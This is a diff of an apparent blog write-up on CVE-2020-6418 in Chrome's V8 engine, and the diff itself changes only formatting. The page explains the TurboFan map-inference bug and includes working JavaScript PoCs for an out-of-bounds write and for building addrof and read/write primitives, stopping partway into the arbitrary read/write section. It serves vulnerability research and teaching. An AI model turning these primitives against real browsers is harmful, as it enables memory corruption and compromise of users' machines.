@@ -52,7 +52,7 @@ If you are new to the concept of SHELF, it is a reflective loading methodology m
 
 
 
-<link rel="stylesheet" href="/assets/combined.min.4d83d9d131fa58e4a3582b029a9d295c34033e4132d049b0e16fa8d1e9ddfebf.css" media="all">
+<link rel="stylesheet" href="/assets/combined.min.a7696e900b4a7802d61674546b1266ce0c55e69a2b88e8bfc3c169feeea091a8.css" media="all">
 
 
 
@@ -212,13 +212,6 @@ $(document).ready(function () {
             </a>
         </p>
         
-      
-        <p class="small ">
-            <a href="/about" >
-                /about
-            </a>
-        </p>
-        
         
     </div>
 
@@ -283,13 +276,13 @@ $(document).ready(function () {
   CVE-2020-6418
   <a class="anchor" href="#cve-2020-6418">#</a>
 </h2>
-<!-- raw HTML omitted -->
+<br />
 <h3 class="heading" id="regression-test-analysis">
   Regression Test Analysis
   <a class="anchor" href="#regression-test-analysis">#</a>
 </h3>
 <p>If we check the bug issue for this vulnerability, we can observe that a <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2062396/4/test/mjsunit/compiler/regress-1053604.js">regression</a> test file was committed, which will serve us as an intial PoC for the given vulnerability. This regression test looks as follows:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// Copyright 2020 the V8 project authors. All rights reserved.
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// Copyright 2020 the V8 project authors. All rights reserved.
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Use of this source code is governed by a BSD-style license that can be
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// found in the LICENSE file.
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Flags: --allow-natives-syntax
@@ -312,17 +305,17 @@ $(document).ready(function () {
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>OptimizeFunctionOnNextCall(main);
 </span></span><span style="display:flex;"><span>main(p);</span></span></code></pre></div>
 We can also inspect the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1053604">bug report</a> for a nice overview of the vulnerability:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Incorrect side effect modelling for JSCreate
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Incorrect side effect modelling for JSCreate
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>The function NodeProperties::InferReceiverMapsUnsafe [1] is responsible for inferring the Map of an object. From the documentation: &#34;This information can be either &#34;reliable&#34;, meaning that the object is guaranteed to have one of these maps at runtime, or &#34;unreliable&#34;, meaning that the object is guaranteed to have HAD one of these maps.&#34;. In the latter case, the caller has to ensure that the object has the correct type, either by using CheckMap nodes or CodeDependencies.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>On a high level, the InferReceiverMapsUnsafe function traverses the effect chain until it finds the node creating the object in question and, at the same time, marks the result as unreliable if it encounters a node without the kNoWrite flag [2], indicating that executing the node could have side-effects such as changing the Maps of an object. There is a mistake in the handling of kJSCreate [3]: if the object in question is not the output of kJSCreate, then the loop continues *without* marking the result as unreliable. This is incorrect because kJSCreate can have side-effects, for example by using a Proxy as third argument to Reflect.construct. The bug can then for example be triggered by inlining Array.pop and changing the elements kind from SMIs to Doubles during the unexpected side effect.</span></span></code></pre></div>
 As seen in the bug report, the vulnerability consists of incorrect side effect modeling for <code>JSCreate</code>. In other words, arbitrary JavaScript code can be invoked at some point during the processing of <code>JSCreate</code> in Ignition (V8&rsquo;s interpreter) generated instructions, that would impact the behavior of Turbofan&rsquo;s JIT compilation pipeline.</p>
 <p>If we modify the provided regression test to return the value popped from the array <code>a</code>, we will see the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ out.gn/x64.release/d8 --allow-natives-syntax ../regress.js
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ out.gn/x64.release/d8 --allow-natives-syntax ../regress.js
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span></span></span></code></pre></div>
 The value popped after the third call to function <code>main</code> is <code>0</code>, when in reality it should have returned <code>2</code>. This means that the call to <code>main(p)</code> is somehow influencing the behavior of array <code>a</code>&rsquo;s elements. We can see this clearly with the following modifications to the regression test:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> a <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">1.1</span>, <span style="color:#bd93f9">1.2</span>, <span style="color:#bd93f9">1.3</span>, <span style="color:#bd93f9">1.4</span>, <span style="color:#bd93f9">1.5</span>];
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> a <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">1.1</span>, <span style="color:#bd93f9">1.2</span>, <span style="color:#bd93f9">1.3</span>, <span style="color:#bd93f9">1.4</span>, <span style="color:#bd93f9">1.5</span>];
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> empty() {}
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> f(p) {
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> a.pop(Reflect.construct(empty, arguments, p));
@@ -341,7 +334,7 @@ The value popped after the third call to function <code>main</code> is <code>0</
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span>OptimizeFunctionOnNextCall(main);
 </span></span><span style="display:flex;"><span>print(main(p));</span></span></code></pre></div>
 If we run the previous script we will see the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ out.gn/x64.release/d8 --allow-natives-syntax ./regress.js          
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ out.gn/x64.release/d8 --allow-natives-syntax ./regress.js          
 </span></span><span style="display:flex;"><span>4.735317402428105e-270</span></span></code></pre></div>
 The elements kind of array <code>a</code> has transitioned from <code>PACKED_DOUBLE_ELEMENTS</code> to <code>PACKED_ELEMENTS</code> however, popped values of <code>a</code> via <code>Array.prototype.pop</code> still return elements of type <code>double</code>. This transition of <em>element kind</em> can be shown in the diagram below, showing the allowed element kinds transitions within V8&rsquo;s JSArrays:</p>
 <p>
@@ -371,7 +364,7 @@ The elements kind of array <code>a</code> has transitioned from <code>PACKED_DOU
 <p>At this point, we can only speculate what is provoking this behavior. However, based on observed triage of the regression test, this change of <em>elements kind</em> is likely provoked by the <code>Proxy</code> function, redeclaring <code>a[0]</code> indexed property as an <code>JSObject</code> instead of a <code>double</code> value.</p>
 <p>We can also suspect that this redeclaration of one of the elements of <code>a</code> has likely provoked V8 to reallocate the array, propagating a different <em>elements kind</em> to <code>a</code>, converting <code>a</code>&rsquo;s elements&rsquo; to <code>HeapNumber</code> objects from <code>double</code> values. However, it&rsquo;s likely that the <em>elements kind</em> inferred by <code>Array.prototype.pop</code> is incorrect, as <code>double</code> values are still being retrieved.</p>
 <p>This can be shown in the following <code>d8</code> run below, in which calls to the native function <code>%DebugPrint</code> have been placed in the appropriate places in the PoC script before and after the transition of elements kind:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>$ out.gn<span style="color:#ff79c6">/</span>x64.debug<span style="color:#ff79c6">/</span>d8 <span style="color:#ff79c6">--</span>allow<span style="color:#ff79c6">-</span>natives<span style="color:#ff79c6">-</span>syntax ..<span style="color:#ff79c6">/</span>regress.js
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>$ out.gn<span style="color:#ff79c6">/</span>x64.debug<span style="color:#ff79c6">/</span>d8 <span style="color:#ff79c6">--</span>allow<span style="color:#ff79c6">-</span>natives<span style="color:#ff79c6">-</span>syntax ..<span style="color:#ff79c6">/</span>regress.js
 </span></span><span style="display:flex;"><span><span style="color:#6272a4">//----------------------------[BEFORE]--------------------------------
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>DebugPrint<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x3d04080c6031</span><span style="color:#ff79c6">:</span> [JSArray]
 </span></span><span style="display:flex;"><span> <span style="color:#ff79c6">-</span> map<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x3d0408281909</span> <span style="color:#ff79c6">&lt;</span>Map(PACKED_DOUBLE_ELEMENTS)<span style="color:#ff79c6">&gt;</span> [FastProperties]
@@ -424,7 +417,7 @@ The elements kind of array <code>a</code> has transitioned from <code>PACKED_DOU
 </span></span></span></code></pre></div>
 We can leverage a type-confusion vulnerability when trying to access any of the elements of <code>a</code>, as we will be fetching a double representation of a <code>HeapNumber</code> object&rsquo;s tagged pointer. This vulnerability would enable us to trivially create <code>addrof</code> and <code>fakeobj</code> primitives. However, we will see moving forward that this won’t work in newer V8 versions, and that in order to exploit this vulnerability a different exploitation strategy will be required.</p>
 <p>This is all there is to understand for now in relation to the supplied regression test. Now let&rsquo;s dig deep into identifying the root-cause analysis in v8&rsquo;s source code.</p>
-<!-- raw HTML omitted -->
+<br />
 <hr>
 <h3 class="heading" id="root-cause-analysis">
   Root-Cause Analysis
@@ -457,7 +450,7 @@ We can leverage a type-confusion vulnerability when trying to access any of the 
 </figure>
 &gt;</p>
 <p>Within the distinct Turbofan&rsquo;s phases, we can highlight the inlining/specialization phase, in which lowering of builtin functions and reduction of specific nodes is performed, such as <code>JSCall</code> reduction and <code>JSCreate</code> lowering:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// Performs strength reduction on {JSConstruct} and {JSCall} nodes,
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// Performs strength reduction on {JSConstruct} and {JSCall} nodes,
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// which might allow inlining or other optimizations to be performed afterwards.
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">class</span> V8_EXPORT_PRIVATE JSCallReducer <span style="color:#ff79c6">final</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">public</span> AdvancedReducer {
 </span></span><span style="display:flex;"><span> <span style="color:#ff79c6">public</span><span style="color:#ff79c6">:</span>
@@ -474,7 +467,7 @@ We can leverage a type-confusion vulnerability when trying to access any of the 
 </span></span><span style="display:flex;"><span>        temp_zone_(temp_zone),
 </span></span><span style="display:flex;"><span>        flags_(flags),
 </span></span><span style="display:flex;"><span>        dependencies_(dependencies) {}</span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// Lowers JSCreate-level operators to fast (inline) allocations.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// Lowers JSCreate-level operators to fast (inline) allocations.
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">class</span> V8_EXPORT_PRIVATE JSCreateLowering <span style="color:#ff79c6">final</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">public</span> NON_EXPORTED_BASE(AdvancedReducer) {
 </span></span><span style="display:flex;"><span> <span style="color:#ff79c6">public</span><span style="color:#ff79c6">:</span>
@@ -494,7 +487,7 @@ We can leverage a type-confusion vulnerability when trying to access any of the 
 </span></span><span style="display:flex;"><span> <span style="color:#ff79c6">private</span><span style="color:#ff79c6">:</span>
 </span></span><span style="display:flex;"><span>  Reduction ReduceJSCreate(Node<span style="color:#ff79c6">*</span> node);</span></span></code></pre></div>
 For our previous PoC&rsquo;s Inlining phase, reduction of <code>Array.prototype.pop</code> built-in function will be performed. The function in charge of doing so is<code>JSCallReducer::ReduceArrayPrototypePop(Node* node)</code> shown below:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// ES6 section 22.1.3.17 Array.prototype.pop ( )
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// ES6 section 22.1.3.17 Array.prototype.pop ( )
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Reduction JSCallReducer<span style="color:#ff79c6">::</span>ReduceArrayPrototypePop(Node<span style="color:#ff79c6">*</span> node) {
 </span></span><span style="display:flex;"><span>  DisallowHeapAccessIf disallow_heap_access(FLAG_concurrent_inlining);
 </span></span><span style="display:flex;"><span>
@@ -540,7 +533,7 @@ For our previous PoC&rsquo;s Inlining phase, reduction of <code>Array.prototype.
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
 This function will fetch the map of the <code>receiver</code> node by invoking <code>MapInference inference(broker(), receiver, effect)</code>  to then retrieve its elements kind as well as implement the logic for <code>Array.protype.pop</code>. Major operations performed by this function are summarized by the comments in the source code shown above for sake of simplicity.</p>
 <p>We should also highlight the call to <code>inference.RelyOnMapsPreferStability</code>, which we will cover in a later stage. For now, let&rsquo;s focus on the call to <code>MapInference</code> constructor along with some of its instance methods. These are shown below :</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>MapInference<span style="color:#ff79c6">::</span><span style="color:#50fa7b">MapInference</span>(JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> object, Node<span style="color:#ff79c6">*</span> effect)
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>MapInference<span style="color:#ff79c6">::</span><span style="color:#50fa7b">MapInference</span>(JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> object, Node<span style="color:#ff79c6">*</span> effect)
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">:</span> <span style="color:#50fa7b">broker_</span>(broker), <span style="color:#50fa7b">object_</span>(object) {
 </span></span><span style="display:flex;"><span>  ZoneHandleSet<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">&gt;</span> maps;
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">auto</span> result <span style="color:#ff79c6">=</span>
@@ -568,7 +561,7 @@ This function will fetch the map of the <code>receiver</code> node by invoking <
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> MapInference<span style="color:#ff79c6">::</span><span style="color:#50fa7b">HaveMaps</span>() <span style="color:#ff79c6">const</span> { <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">!</span>maps_.<span style="color:#50fa7b">empty</span>(); }</span></span></code></pre></div>
 We can notice that at the beginning of the function, a call to <code>NodeProperties::InferReceiverMapsUnsafe</code> is performed. This function walks the effect chain in search for a node that can give hints into inferring the map of the receiver object. At the same time, this function is also in charge of marking the result as unreliable if it encounters a node without the <code>kNoWrite</code> flag, indicating that executing the node could have side-effects such as changing the map of an object.</p>
 <p>This function returns an enum composed of three possible values which are the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// Walks up the {effect} chain to find a witness that provides map
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// Walks up the {effect} chain to find a witness that provides map
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// information about the {receiver}. Can look through potentially
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// side effecting nodes.
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">enum</span> <span style="color:#50fa7b">InferReceiverMapsResult</span> {
@@ -577,7 +570,7 @@ We can notice that at the beginning of the function, a call to <code>NodePropert
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    kUnreliableReceiverMaps  <span style="color:#6272a4">// Receiver maps might have changed (side-effect).
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  };</span></span></code></pre></div>
 A summerized overview of the implementation of <code>NodeProperties::InferReceiverMapsUnsafe</code> is shown below, highlighting the most important parts of this function:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// static
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#6272a4">// static
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>NodeProperties<span style="color:#ff79c6">::</span>InferReceiverMapsResult NodeProperties<span style="color:#ff79c6">::</span>InferReceiverMapsUnsafe(
 </span></span><span style="display:flex;"><span>    JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> receiver, Node<span style="color:#ff79c6">*</span> effect,
 </span></span><span style="display:flex;"><span>    ZoneHandleSet<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">&gt;*</span> maps_return) {
@@ -625,7 +618,7 @@ In this function, we can focus on the switch case nested in a while loop that tr
 <p>This opcode will be generated for the invocation of <code>Reflect.construct</code>. Eventually, the while loop will run out of nodes to check and will fail to find an effect node with a map similar to the one of the receiver since the receiver map was changed via the <code>Proxy</code> function invocation in <code>Reflect.construct</code>. However, the function will still return a result of <code>kReliableReceiverMaps</code> despite having the receiver&rsquo;s map not being reliable.</p>
 <p>We can see the patch applied to this function commented out, highlighting where the vulnerability resides. The invocation of <code>Reflect.construct</code> will in fact be able to change the maps of the receiver node, in this case the <code>JSArray</code> <code>a</code>. However, due to a logical error, <code>NodeProperties::InferReceiverMapsUnsafe</code> will fail to mark this node as <code>kUnreliableReceiverMaps</code>, as to denote that the receiver maps may have changed.</p>
 <p>The implications of not marking this node as unreliable will become clear by the result of the invokation of <code>MapInference::RelyOnMapsPreferStability</code> by <code>JSCallReducer::ReduceArrayPrototypePop</code> shown below:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>bool MapInference<span style="color:#ff79c6">::</span>RelyOnMapsPreferStability(
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>bool MapInference<span style="color:#ff79c6">::</span>RelyOnMapsPreferStability(
 </span></span><span style="display:flex;"><span>    CompilationDependencies<span style="color:#ff79c6">*</span> dependencies, JSGraph<span style="color:#ff79c6">*</span> jsgraph, Node<span style="color:#ff79c6">**</span> effect,
 </span></span><span style="display:flex;"><span>    Node<span style="color:#ff79c6">*</span> control, <span style="color:#ff79c6">const</span> FeedbackSource<span style="color:#ff79c6">&amp;</span> feedback) {
 </span></span><span style="display:flex;"><span>  CHECK(HaveMaps());
@@ -661,10 +654,10 @@ In this function, we can focus on the switch case nested in a while loop that tr
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
 We can observe that a call to <code>MapInference::Safe()</code> will be done, and if succesful, the function will return immediately. The implementation of this function is the following:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>bool MapInference<span style="color:#ff79c6">::</span>Safe() <span style="color:#ff79c6">const</span> {
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>bool MapInference<span style="color:#ff79c6">::</span>Safe() <span style="color:#ff79c6">const</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> maps_state_ <span style="color:#ff79c6">!=</span> kUnreliableNeedGuard; }</span></span></code></pre></div>
 Because the <code>JSCreate</code> node was never marked as <code>kUnreliableReceiverMaps</code>, this function will always return true. This comparative operation can be shown below.</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>maps_state_ <span style="color:#ff79c6">=</span> (result <span style="color:#ff79c6">==</span> NodeProperties<span style="color:#ff79c6">::</span>kUnreliableReceiverMaps)
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>maps_state_ <span style="color:#ff79c6">=</span> (result <span style="color:#ff79c6">==</span> NodeProperties<span style="color:#ff79c6">::</span>kUnreliableReceiverMaps)
 </span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">?</span> kUnreliableDontNeedGuard
 </span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">:</span> kReliableOrGuarded;</span></span></code></pre></div>
 The code path that should mitigate this vulnerability is the one in which the function <code>InsertMapChecks</code> is invoked. This function will be in charge to add a <code>CheckMaps</code> node before the effect nodes loading and storing the popped element from the receiver object takes place, assuring that a correct map will be used for these operations.</p>
@@ -718,7 +711,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
     
 </figure>
 </p>
-<!-- raw HTML omitted -->
+<br />
 <hr>
 <h3 class="heading" id="exploit-strategy">
   Exploit Strategy
@@ -732,7 +725,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
 <p>However, this leaves for an interesting caveat that is useful for absuing pointer compression-enabled element transitioning. If the elements of the subject array are originally of elements kind <code>PACKED_DOUBLE_ELEMENTS</code> and this array is transitioning to <code>PACKED_ELEMENTS</code>, this will ultimately create an array half of the size of the original one, since <code>PACKED_ELEMENTS</code> corresponds to elements stored as <code>dword</code> tagged pointers when pointer compression is enabled, in contrast to double values stored as <code>qwords</code> as previously mentioned.</p>
 <p>Since the map inference of the array is incorrect after the array has transitioned to <code>PACKED_ELEMENTS</code> and any <code>JSArray</code> builtin function is subject to this wrong map inference, we can abuse this scenario to achieve OOB read/write via the use of <code>Array.prototype.pop</code> and <code>Array.prototype.push</code>.</p>
 <p>However, there is a more convenient avenue for exploitation documented by <a href="https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/">Exodus Intelligence</a>. Instead of recurrently using <code>JSArray</code> builtin functions as <code>Array.prototype.pop</code> and <code>Array.prototype.push</code> to read and write memory, a single OOB write can be leveraged to overwrite the length field of an adjacent array in memory. This will enable an easier approach to build stronger primitives moving forward. Here is a PoC for this exploitation strategy:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> a <span style="color:#ff79c6">=</span> [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span style="color:#bd93f9">1.1</span>];
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> a <span style="color:#ff79c6">=</span> [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span style="color:#bd93f9">1.1</span>];
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> b;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> empty() {}
@@ -766,7 +759,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>console.log(b.length);   <span style="color:#6272a4">// prints 31337
 </span></span></span></code></pre></div>
-<!-- raw HTML omitted --></p>
+<br /></p>
 <hr>
 <h2 class="heading" id="achieving-relative-arbitrary-readwrite">
   Achieving Relative Arbitrary Read/Write
@@ -778,7 +771,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
 <p>This can be done by replacing the value of the elements tagged pointer of an adjacent double array (<code>c</code>) via our OOB double array (<code>b</code>). If we replace the value of this field we will be able to dereference its contents while accessing the elements of <code>c</code>, ultimately enabling us to read or write to tagged pointers.</p>
 <p>In addition, an <code>addrof</code> primitive can be achieved by leaking the maps of adjacent boxed/unboxed arrays, and interchanging these also in an adjacent double array.</p>
 <p>The implementation of these primitives having our preliminar OOB access can be shown as follows:</p>
-<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> a <span style="color:#ff79c6">=</span> [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span style="color:#bd93f9">1.1</span>];
+<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> a <span style="color:#ff79c6">=</span> [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span style="color:#bd93f9">1.1</span>];
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> b;
 </span></span><span style="display:flex;"><span>                
 </span></span><span style="display:flex;"><span><span style="color:#6272a4">//triggering Turbofan side-effect bug leveraging OOB write to b
@@ -820,7 +813,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
 </span></span><span style="display:flex;"><span>    b[<span style="color:#bd93f9">15</span>] <span style="color:#ff79c6">=</span> tmp;
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span>;
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
-<!-- raw HTML omitted --></p>
+<br /></p>
 <hr>
 <h2 class="heading" id="achieving-unstable-arbitrary-readwrite">
   Achieving Unstable Arbitrary Read/Write
@@ -833,7 +826,7 @@ The code path that should mitigate this vulnerability is the one in which the fu
 <li>Overwrite the unboxed <code>backing_store</code> pointer of an ArrayBuffer and access it via a DataView object, enabling us to read and write memory to unboxed addresses, with sizes not limited to 8 bytes per operation.</li>
 </ul>
 <p>In order to leak the value of <code>isolate root</code>, we can leverage our <code>weak_read</code> primitive to leak the value of <code>external_pointer</code> from a typed array. To illustrate this, let&rsquo;s take a look at the fields of a <code>Uint8Array</code> object:</p>
